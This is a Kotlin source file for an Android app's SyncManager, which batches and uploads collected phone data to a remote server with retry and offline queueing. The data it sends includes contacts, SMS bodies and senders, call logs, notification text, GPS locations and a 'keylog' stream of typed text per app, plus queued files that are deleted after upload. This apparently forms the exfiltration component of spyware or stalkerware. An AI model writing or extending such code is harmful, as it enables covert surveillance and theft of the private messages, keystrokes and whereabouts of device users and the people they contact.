package com.abuzahra.manager.sync

import android.content.Context
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.util.Log
import com.abuzahra.manager.App
import com.abuzahra.manager.api.ApiClient
import com.abuzahra.manager.database.AbuZahraDatabase
import com.abuzahra.manager.database.entity.SyncQueueEntity
import com.abuzahra.manager.storage.StorageManager
import kotlinx.coroutines.*
import kotlinx.coroutines.flow.MutableStateFlow
import kotlinx.coroutines.flow.StateFlow
import org.json.JSONObject
import java.io.File
import java.util.concurrent.ConcurrentHashMap
import java.util.concurrent.atomic.AtomicBoolean

/**
 * SyncManager - Manages data synchronization with server
 * Handles upload queue, retry logic, and offline support
 */
object SyncManager {
    
    private const val TAG = "SyncManager"
    private const val MAX_RETRY_ATTEMPTS = 5
    private const val RETRY_DELAY_BASE = 5000L // 5 seconds base delay
    private const val BATCH_SIZE = 50
    
    private lateinit var database: AbuZahraDatabase
    private val syncScope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    
    // Sync state
    private val isSyncing = AtomicBoolean(false)
    private val _syncState = MutableStateFlow<SyncState>(SyncState.Idle)
    val syncState: StateFlow<SyncState> = _syncState
    
    // Pending items
    private val pendingItems = ConcurrentHashMap<String, SyncItem>()
    private val failedItems = ConcurrentHashMap<String, FailedItem>()
    
    // Sync statistics
    private var totalSynced = 0L
    private var totalFailed = 0L
    private var lastSyncTime = 0L
    
    /**
     * Initialize sync manager
     */
    fun initialize(context: Context) {
        database = AbuZahraDatabase.getInstance(context)
        
        // Load pending items from database
        syncScope.launch {
            loadPendingItems()
        }
        
        Log.i(TAG, "SyncManager initialized")
    }
    
    /**
     * Sync state sealed class
     */
    sealed class SyncState {
        object Idle : SyncState()
        data class Syncing(val itemsRemaining: Int, val currentItem: String?) : SyncState()
        data class Error(val message: String) : SyncState()
        data class Completed(val itemsSynced: Int, val itemsFailed: Int) : SyncState()
    }
    
    /**
     * Sync types
     */
    enum class SyncType(val value: String) {
        CONTACTS("contacts"),
        SMS("sms"),
        CALLS("calls"),
        NOTIFICATIONS("notifications"),
        APPS("apps"),
        LOCATION("location"),
        KEYLOG("keylog"),
        FILE("file"),
        DEVICE_INFO("device_info"),
        EVENT("event")
    }
    
    /**
     * Start sync
     */
    suspend fun startSync(forced: Boolean = false): SyncResult {
        if (isSyncing.get() && !forced) {
            return SyncResult.AlreadyRunning
        }
        
        if (!isNetworkAvailable()) {
            _syncState.value = SyncState.Error("No network available")
            return SyncResult.NoNetwork
        }
        
        isSyncing.set(true)
        _syncState.value = SyncState.Syncing(0, null)
        
        var synced = 0
        var failed = 0
        
        try {
            // Process pending items from queue
            val pendingQueue = database.syncQueueDao().getPendingBatch(BATCH_SIZE)
            
            pendingQueue.forEachIndexed { index, item ->
                _syncState.value = SyncState.Syncing(pendingQueue.size - index, item.syncType)
                
                val result = processSyncItem(item)
                if (result) {
                    synced++
                    database.syncQueueDao().markCompleted(item.id)
                } else {
                    failed++
                    handleSyncFailure(item, "Sync failed")
                }
            }
            
            // Process failed items for retry
            val retryableItems = database.syncQueueDao().getRetryable()
            retryableItems.forEach { item ->
                if (item.retryCount < item.maxRetries) {
                    val result = processSyncItem(item)
                    if (result) {
                        synced++
                        database.syncQueueDao().markCompleted(item.id)
                        failedItems.remove(item.dataId)
                    } else {
                        val nextAttempt = calculateNextRetry(item.retryCount + 1)
                        database.syncQueueDao().markFailed(item.id, "Retry failed", nextAttempt)
                    }
                }
            }
            
            // Sync files
            val fileResult = syncPendingFiles()
            synced += fileResult.first
            failed += fileResult.second
            
            lastSyncTime = System.currentTimeMillis()
            totalSynced += synced
            totalFailed += failed
            
            _syncState.value = SyncState.Completed(synced, failed)
            
            Log.i(TAG, "Sync completed: $synced synced, $failed failed")
            
            return SyncResult.Success(synced, failed)
        } catch (e: Exception) {
            Log.e(TAG, "Sync error", e)
            _syncState.value = SyncState.Error(e.message ?: "Sync failed")
            return SyncResult.Error(e.message ?: "Sync failed")
        } finally {
            isSyncing.set(false)
        }
    }
    
    /**
     * Process single sync item
     */
    private suspend fun processSyncItem(item: SyncQueueEntity): Boolean {
        return try {
            when (item.syncType) {
                SyncType.CONTACTS.value -> syncContacts(item)
                SyncType.SMS.value -> syncSms(item)
                SyncType.CALLS.value -> syncCalls(item)
                SyncType.NOTIFICATIONS.value -> syncNotifications(item)
                SyncType.LOCATION.value -> syncLocation(item)
                SyncType.KEYLOG.value -> syncKeylog(item)
                SyncType.EVENT.value -> syncEvent(item)
                SyncType.DEVICE_INFO.value -> syncDeviceInfo(item)
                else -> false
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to process sync item: ${item.syncType}", e)
            false
        }
    }
    
    /**
     * Sync contacts
     */
    private suspend fun syncContacts(item: SyncQueueEntity): Boolean {
        val contacts = database.contactDao().getUnsynced()
        if (contacts.isEmpty()) return true
        
        contacts.chunked(BATCH_SIZE).forEach { batch ->
            val jsonArray = org.json.JSONArray()
            batch.forEach { contact ->
                jsonArray.put(org.json.JSONObject().apply {
                    put("id", contact.contactId)
                    put("name", contact.name)
                    put("phone", contact.phoneNumber)
                    put("email", contact.email)
                })
            }
            
            val response = ApiClient.sendData("contacts", jsonArray.toString())
            if (response) {
                database.contactDao().markSynced(batch.map { it.id })
            }
        }
        
        return true
    }
    
    /**
     * Sync SMS
     */
    private suspend fun syncSms(item: SyncQueueEntity): Boolean {
        val messages = database.smsDao().getUnsynced()
        if (messages.isEmpty()) return true
        
        messages.chunked(BATCH_SIZE).forEach { batch ->
            val jsonArray = org.json.JSONArray()
            batch.forEach { sms ->
                jsonArray.put(org.json.JSONObject().apply {
                    put("id", sms.messageId)
                    put("address", sms.address)
                    put("body", sms.body)
                    put("date", sms.date)
                    put("type", sms.type)
                })
            }
            
            val response = ApiClient.sendData("sms", jsonArray.toString())
            if (response) {
                database.smsDao().markSynced(batch.map { it.id })
            }
        }
        
        return true
    }
    
    /**
     * Sync calls
     */
    private suspend fun syncCalls(item: SyncQueueEntity): Boolean {
        val calls = database.callDao().getUnsynced()
        if (calls.isEmpty()) return true
        
        calls.chunked(BATCH_SIZE).forEach { batch ->
            val jsonArray = org.json.JSONArray()
            batch.forEach { call ->
                jsonArray.put(org.json.JSONObject().apply {
                    put("id", call.callId)
                    put("number", call.number)
                    put("date", call.date)
                    put("duration", call.duration)
                    put("type", call.type)
                })
            }
            
            val response = ApiClient.sendData("calls", jsonArray.toString())
            if (response) {
                database.callDao().markSynced(batch.map { it.id })
            }
        }
        
        return true
    }
    
    /**
     * Sync notifications
     */
    private suspend fun syncNotifications(item: SyncQueueEntity): Boolean {
        val notifications = database.notificationDao().getUnsynced()
        if (notifications.isEmpty()) return true
        
        notifications.chunked(BATCH_SIZE).forEach { batch ->
            val jsonArray = org.json.JSONArray()
            batch.forEach { notif ->
                jsonArray.put(org.json.JSONObject().apply {
                    put("package", notif.packageName)
                    put("title", notif.title)
                    put("text", notif.text)
                    put("timestamp", notif.timestamp)
                })
            }
            
            val response = ApiClient.sendData("notifications", jsonArray.toString())
            if (response) {
                database.notificationDao().markSynced(batch.map { it.id })
            }
        }
        
        return true
    }
    
    /**
     * Sync location
     */
    private suspend fun syncLocation(item: SyncQueueEntity): Boolean {
        val locations = database.locationDao().getUnsynced()
        if (locations.isEmpty()) return true
        
        locations.chunked(BATCH_SIZE).forEach { batch ->
            val jsonArray = org.json.JSONArray()
            batch.forEach { loc ->
                jsonArray.put(org.json.JSONObject().apply {
                    put("lat", loc.latitude)
                    put("lon", loc.longitude)
                    put("accuracy", loc.accuracy)
                    put("timestamp", loc.timestamp)
                    put("provider", loc.provider)
                })
            }
            
            val response = ApiClient.sendData("location", jsonArray.toString())
            if (response) {
                database.locationDao().markSynced(batch.map { it.id })
            }
        }
        
        return true
    }
    
    /**
     * Sync keylog
     */
    private suspend fun syncKeylog(item: SyncQueueEntity): Boolean {
        val entries = database.keylogDao().getUnsynced()
        if (entries.isEmpty()) return true
        
        entries.chunked(BATCH_SIZE).forEach { batch ->
            val jsonArray = org.json.JSONArray()
            batch.forEach { entry ->
                jsonArray.put(org.json.JSONObject().apply {
                    put("package", entry.packageName)
                    put("text", entry.text)
                    put("timestamp", entry.timestamp)
                })
            }
            
            val response = ApiClient.sendData("keylog", jsonArray.toString())
            if (response) {
                database.keylogDao().markSynced(batch.map { it.id })
            }
        }
        
        return true
    }
    
    /**
     * Sync event
     */
    private suspend fun syncEvent(item: SyncQueueEntity): Boolean {
        val payload = item.dataPayload ?: return false
        return ApiClient.sendData("event", payload)
    }
    
    /**
     * Sync device info
     */
    private suspend fun syncDeviceInfo(item: SyncQueueEntity): Boolean {
        val payload = item.dataPayload ?: return false
        return ApiClient.sendData("device_info", payload)
    }
    
    /**
     * Sync pending files
     */
    private suspend fun syncPendingFiles(): Pair<Int, Int> {
        var synced = 0
        var failed = 0
        
        val filesDir = StorageManager.getDirectory(StorageManager.Dir.UPLOADS)
        filesDir.listFiles()?.forEach { file ->
            try {
                val result = ApiClient.uploadFile(file, file.nameWithoutExtension)
                if (result) {
                    file.delete()
                    synced++
                } else {
                    failed++
                }
            } catch (e: Exception) {
                Log.e(TAG, "Failed to upload file: ${file.name}", e)
                failed++
            }
        }
        
        return Pair(synced, failed)
    }
    
    /**
     * Add item to sync queue
     */
    suspend fun addToQueue(
        type: SyncType,
        dataId: String,
        payload: String? = null,
        priority: Int = 0
    ): Long {
        val item = SyncQueueEntity(
            syncType = type.value,
            dataId = dataId,
            dataPayload = payload,
            priority = priority,
            nextAttempt = System.currentTimeMillis(),
            error = null
        )
        return database.syncQueueDao().insert(item)
    }
    
    /**
     * Handle sync failure
     */
    private suspend fun handleSyncFailure(item: SyncQueueEntity, error: String) {
        val nextAttempt = calculateNextRetry(item.retryCount + 1)
        database.syncQueueDao().markFailed(item.id, error, nextAttempt)
        
        failedItems[item.dataId] = FailedItem(
            dataId = item.dataId,
            syncType = item.syncType,
            error = error,
            retryCount = item.retryCount + 1,
            nextAttempt = nextAttempt
        )
    }
    
    /**
     * Calculate next retry time with exponential backoff
     */
    private fun calculateNextRetry(retryCount: Int): Long {
        val delay = RETRY_DELAY_BASE * (1 shl retryCount.coerceAtMost(5))
        return System.currentTimeMillis() + delay
    }
    
    /**
     * Load pending items from database
     */
    private suspend fun loadPendingItems() {
        val pending = database.syncQueueDao().getPending()
        pending.forEach { item ->
            pendingItems[item.dataId] = SyncItem(
                dataId = item.dataId,
                syncType = item.syncType,
                priority = item.priority
            )
        }
        Log.i(TAG, "Loaded ${pending.size} pending items")
    }
    
    /**
     * Check if network is available
     */
    private fun isNetworkAvailable(): Boolean {
        val cm = App.instance.getSystemService(Context.CONNECTIVITY_SERVICE) as ConnectivityManager
        val network = cm.activeNetwork ?: return false
        val capabilities = cm.getNetworkCapabilities(network) ?: return false
        
        return capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET) &&
               capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_VALIDATED)
    }
    
    /**
     * Get sync statistics
     */
    fun getStats(): SyncStats {
        return SyncStats(
            totalSynced = totalSynced,
            totalFailed = totalFailed,
            lastSyncTime = lastSyncTime,
            pendingCount = pendingItems.size,
            failedCount = failedItems.size,
            isOnline = isNetworkAvailable(),
            isSyncing = isSyncing.get()
        )
    }
    
    /**
     * Clear sync queue
     */
    suspend fun clearQueue() {
        pendingItems.clear()
        failedItems.clear()
        database.syncQueueDao().deleteCompleted()
    }
    
    /**
     * Cancel current sync
     */
    fun cancelSync() {
        isSyncing.set(false)
        _syncState.value = SyncState.Idle
    }
    
    // Data classes
    data class SyncItem(
        val dataId: String,
        val syncType: String,
        val priority: Int
    )
    
    data class FailedItem(
        val dataId: String,
        val syncType: String,
        val error: String,
        val retryCount: Int,
        val nextAttempt: Long
    )
    
    data class SyncStats(
        val totalSynced: Long,
        val totalFailed: Long,
        val lastSyncTime: Long,
        val pendingCount: Int,
        val failedCount: Int,
        val isOnline: Boolean,
        val isSyncing: Boolean
    )
    
    sealed class SyncResult {
        object AlreadyRunning : SyncResult()
        object NoNetwork : SyncResult()
        data class Success(val synced: Int, val failed: Int) : SyncResult()
        data class Error(val message: String) : SyncResult()
    }
}
